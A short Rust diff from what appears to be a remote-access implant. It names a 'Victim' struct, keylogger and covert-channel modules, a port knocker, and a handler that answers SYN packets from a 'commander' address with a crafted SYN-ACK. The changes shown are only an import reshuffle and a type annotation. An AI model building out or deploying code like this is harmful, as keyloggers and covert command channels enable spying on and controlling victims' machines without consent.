@@ -8,9 +8,9 @@ use pnet::packet::Packet;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::datalink::{self, NetworkInterface};
+use crate::covert;
 
 mod keylogger;
-mod covert;
 mod port_knkr;
 
 use keylogger::Control as KeylogControl;
@@ -114,7 +114,7 @@ impl Victim {
                         println!("[+] SYN received from {}", commander_ip);
 
                         let client_seq = tcp.get_sequence();
-                        let server_seq = 0x1337;
+                        let server_seq: u32 = 0x1337;
 
                         // Build SYN-ACK
                         let syn_ack = covert::build_syn_ack_packet(
